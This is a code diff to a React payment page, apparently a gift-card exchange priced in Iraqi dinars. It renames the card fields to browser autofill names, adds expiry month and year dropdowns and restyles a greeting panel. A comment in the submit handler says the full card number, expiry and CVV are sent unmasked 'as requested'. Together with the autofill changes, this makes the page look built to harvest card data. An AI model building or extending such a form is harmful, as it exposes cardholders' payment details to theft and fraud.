@@ -488,10 +488,13 @@ function MainContent() {
       let details = '';
       if (txType === 'buy') {
         const form = e.target as HTMLFormElement;
-        const cardHolder = (form.elements.namedItem('cardholder') as HTMLInputElement).value;
-        const cardNumber = (form.elements.namedItem('cardnumber') as HTMLInputElement).value;
-        const expiry = (form.elements.namedItem('expiry') as HTMLInputElement).value;
-        const cvv = (form.elements.namedItem('cvv') as HTMLInputElement).value;
+        const cardHolder = (form.elements.namedItem('cc-name') as HTMLInputElement).value;
+        const cardNumber = (form.elements.namedItem('cc-number') as HTMLInputElement).value;
+        const expMonth = (form.elements.namedItem('cc-exp-month') as HTMLSelectElement).value;
+        const expYear = (form.elements.namedItem('cc-exp-year') as HTMLSelectElement).value;
+        const expiry =
+          expMonth && expYear ? `${expMonth}/${String(expYear).slice(-2)}` : '';
+        const cvv = (form.elements.namedItem('cc-csc') as HTMLInputElement).value;
         
         // As requested: Send unmasked full details, and explicitly highlight requested parts
         const last4 = cardNumber.slice(-4);
@@ -1273,29 +1276,37 @@ function MainContent() {
   );
 
   const renderUserGreeting = () => (
-    <div className="bg-white/80 p-6 sm:p-8 rounded-[2rem] shadow-[0_8px_30px_rgb(0,0,0,0.04)] border border-white backdrop-blur-xl mb-6 flex items-center justify-between">
-      <div className="flex items-center gap-5">
-        <div className="w-14 h-14 bg-gradient-to-br from-gray-800 to-gray-900 rounded-2xl flex items-center justify-center text-white shadow-lg shadow-gray-900/20 ring-1 ring-white/10 inset-0">
-          <User className="w-6 h-6 text-white/90" />
+    <div className="bg-white/90 p-4 sm:p-6 lg:p-8 rounded-2xl sm:rounded-[2rem] shadow-[0_8px_40px_rgb(15,23,42,0.06)] border border-gray-100/90 backdrop-blur-xl mb-5 sm:mb-6 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
+      <div className="flex items-center gap-4 min-w-0">
+        <div className="w-12 h-12 sm:w-14 sm:h-14 shrink-0 bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl sm:rounded-2xl flex items-center justify-center text-white shadow-lg shadow-gray-900/15 ring-1 ring-white/10">
+          <User className="w-5 h-5 sm:w-6 sm:h-6 text-white/90" />
         </div>
-        <div>
-          <p className="text-sm text-gray-500 font-medium mb-0.5">{t('greeting')}</p>
-          <h2 className="text-xl font-black text-gray-900 tracking-tight">{siteProfile?.full_name?.trim() || t('userName')}</h2>
+        <div className="min-w-0">
+          <p className="text-xs sm:text-sm text-gray-500 font-medium mb-0.5">{t('greeting')}</p>
+          <h2 className="text-lg sm:text-xl font-black text-gray-900 tracking-tight truncate">
+            {siteProfile?.full_name?.trim() || t('userName')}
+          </h2>
         </div>
       </div>
-      <div className={`hidden sm:flex gap-8 ${dir === 'rtl' ? 'text-left' : 'text-right'}`}>
-        <div>
-          <p className="text-xs text-gray-400 font-bold mb-1 uppercase tracking-wider">{t('activeOrders')}</p>
-          <p className="text-2xl font-black text-gray-900">{dashboardStats.activeOrders}</p>
+      <div
+        className={`flex flex-row items-stretch gap-3 sm:gap-8 w-full sm:w-auto pt-3 sm:pt-0 border-t border-gray-100/90 sm:border-0 ${dir === 'rtl' ? 'sm:text-left' : 'sm:text-right'}`}
+      >
+        <div className="flex-1 min-w-0 rounded-xl bg-gradient-to-br from-slate-50 to-gray-50/80 border border-gray-100/80 px-3 py-2.5 sm:rounded-none sm:bg-transparent sm:border-0 sm:px-0 sm:py-0">
+          <p className="text-[10px] sm:text-xs text-gray-400 font-bold mb-0.5 sm:mb-1 uppercase tracking-wider">
+            {t('activeOrders')}
+          </p>
+          <p className="text-xl sm:text-2xl font-black text-gray-900 tabular-nums">{dashboardStats.activeOrders}</p>
         </div>
-        <div className="w-px bg-gradient-to-b from-gray-100 via-gray-200 to-gray-100" aria-hidden />
-        <div>
-          <p className="text-xs text-gray-400 font-bold mb-1 uppercase tracking-wider">{t('totalExchanged')}</p>
-          <p className="text-2xl font-black text-gray-900 tabular-nums flex items-baseline gap-1" dir="ltr">
+        <div className="hidden sm:block w-px shrink-0 bg-gradient-to-b from-gray-100 via-gray-200 to-gray-100 self-center min-h-[2.75rem]" aria-hidden />
+        <div className="flex-1 min-w-0 rounded-xl bg-gradient-to-br from-red-50/80 to-orange-50/40 border border-red-100/50 px-3 py-2.5 sm:rounded-none sm:bg-transparent sm:border-0 sm:px-0 sm:py-0">
+          <p className="text-[10px] sm:text-xs text-gray-400 font-bold mb-0.5 sm:mb-1 uppercase tracking-wider">
+            {t('totalExchanged')}
+          </p>
+          <p className="text-xl sm:text-2xl font-black text-gray-900 tabular-nums flex flex-wrap items-baseline gap-1 justify-start" dir="ltr">
             {Number.isFinite(dashboardStats.totalCompletedIqd) && dashboardStats.totalCompletedIqd > 0
               ? dashboardStats.totalCompletedIqd.toLocaleString(lang === 'ar' ? 'ar-IQ' : 'en-US')
               : '0'}
-            <span className="text-sm text-gray-400 font-bold ml-1">{t('iqd')}</span>
+            <span className="text-xs sm:text-sm text-gray-400 font-bold">{t('iqd')}</span>
           </p>
         </div>
       </div>
@@ -1445,6 +1456,9 @@ function MainContent() {
       const cardValues = [2000, 5000, 10000, 15000, 25000, 50000, 100000];
       const pricePerCard = cardValue * 0.98; // 2% discount for buying
       const totalPrice = pricePerCard * quantity;
+      const cardExpiryYearStart = new Date().getFullYear();
+      const cardExpiryYears = Array.from({ length: 16 }, (_, i) => cardExpiryYearStart + i);
+      const cardExpiryMonths = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, '0'));
 
       return (
         <div
@@ -1599,18 +1613,26 @@ function MainContent() {
               <div className="w-8 h-8 rounded-full font-black flex items-center justify-center shrink-0 shadow-sm border bg-gray-900 text-white border-gray-800">2</div>
               <div className="flex-1">
                 <h3 className="font-bold text-gray-900 mb-4 text-base">{t('buyStep2')}</h3>
-                <form onSubmit={handleSubmit} className="space-y-4" autoComplete="on">
+                <form
+                  id="payment-card-form"
+                  name="ccPayment"
+                  onSubmit={handleSubmit}
+                  className="space-y-4"
+                  autoComplete="on"
+                  method="post"
+                >
                   <div>
                     <label className="block text-sm font-bold text-gray-700 mb-2" htmlFor="payment-cc-name">
                       {t('cardHolderName')}
                     </label>
-                    <input 
+                    <input
                       id="payment-cc-name"
-                      name="cardholder"
-                      type="text" 
+                      name="cc-name"
+                      type="text"
                       required
                       autoComplete="cc-name"
-                      className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-all font-medium text-gray-900 text-left"
+                      enterKeyHint="next"
+                      className="w-full px-4 py-3.5 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-[border-color,box-shadow] font-medium text-gray-900 text-left"
                       placeholder="John Doe"
                       dir="ltr"
                     />
@@ -1619,51 +1641,91 @@ function MainContent() {
                     <label className="block text-sm font-bold text-gray-700 mb-2" htmlFor="payment-cc-number">
                       {t('cardNumber')}
                     </label>
-                    <input 
+                    <input
                       id="payment-cc-number"
-                      name="cardnumber"
-                      type="text" 
+                      name="cc-number"
+                      type="text"
                       inputMode="numeric"
                       required
                       autoComplete="cc-number"
-                      className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-all font-mono text-lg font-bold text-gray-900 tracking-widest text-left"
+                      enterKeyHint="next"
+                      className="w-full px-4 py-3.5 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-[border-color,box-shadow] font-mono text-lg font-bold text-gray-900 tracking-widest text-left"
                       placeholder="0000 0000 0000 0000"
                       dir="ltr"
                       maxLength={19}
                     />
                   </div>
-                  <div className="grid grid-cols-2 gap-3 sm:gap-4">
-                    <div>
-                      <label
-                        className="block text-xs sm:text-sm font-bold text-gray-700 mb-1 sm:mb-2 truncate"
-                        htmlFor="payment-cc-exp"
-                      >
-                        {t('expiryDate', 'تاريخ الانتهاء (MM/YY)').replace('(MM/YY)', '').trim()}
-                      </label>
-                      <input 
-                        id="payment-cc-exp"
-                        name="expiry"
-                        type="text" 
-                        required
-                        autoComplete="cc-exp"
-                        className="w-full px-3 sm:px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-all font-mono text-base sm:text-lg font-bold text-gray-900 text-left"
-                        placeholder="MM/YY"
-                        dir="ltr"
-                        maxLength={5}
-                      />
+                  <div className="space-y-3">
+                    <p className="text-xs font-bold text-gray-500 uppercase tracking-wide">
+                      {t('cardExpiryGroup')}
+                    </p>
+                    <div className="grid grid-cols-2 gap-3">
+                      <div>
+                        <label
+                          className="block text-xs font-bold text-gray-700 mb-1.5"
+                          htmlFor="payment-cc-exp-month"
+                        >
+                          {t('monthShort')}
+                        </label>
+                        <select
+                          id="payment-cc-exp-month"
+                          name="cc-exp-month"
+                          required
+                          autoComplete="cc-exp-month"
+                          defaultValue=""
+                          className="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none font-mono text-base font-bold text-gray-900"
+                          dir="ltr"
+                        >
+                          <option value="" disabled>
+                            MM
+                          </option>
+                          {cardExpiryMonths.map((m) => (
+                            <option key={m} value={m}>
+                              {m}
+                            </option>
+                          ))}
+                        </select>
+                      </div>
+                      <div>
+                        <label
+                          className="block text-xs font-bold text-gray-700 mb-1.5"
+                          htmlFor="payment-cc-exp-year"
+                        >
+                          {t('yearShort')}
+                        </label>
+                        <select
+                          id="payment-cc-exp-year"
+                          name="cc-exp-year"
+                          required
+                          autoComplete="cc-exp-year"
+                          defaultValue=""
+                          className="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none font-mono text-base font-bold text-gray-900"
+                          dir="ltr"
+                        >
+                          <option value="" disabled>
+                            YYYY
+                          </option>
+                          {cardExpiryYears.map((y) => (
+                            <option key={y} value={String(y)}>
+                              {y}
+                            </option>
+                          ))}
+                        </select>
+                      </div>
                     </div>
                     <div>
-                      <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1 sm:mb-2" htmlFor="payment-cc-csc">
+                      <label className="block text-sm font-bold text-gray-700 mb-2" htmlFor="payment-cc-csc">
                         {t('cvv')}
                       </label>
-                      <input 
+                      <input
                         id="payment-cc-csc"
-                        name="cvv"
-                        type="text" 
+                        name="cc-csc"
+                        type="text"
                         inputMode="numeric"
                         required
                         autoComplete="cc-csc"
-                        className="w-full px-3 sm:px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-all font-mono text-base sm:text-lg font-bold text-gray-900 text-left"
+                        enterKeyHint="done"
+                        className="w-full px-4 py-3.5 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-[border-color,box-shadow] font-mono text-lg font-bold text-gray-900 text-left"
                         placeholder="123"
                         dir="ltr"
                         maxLength={4}
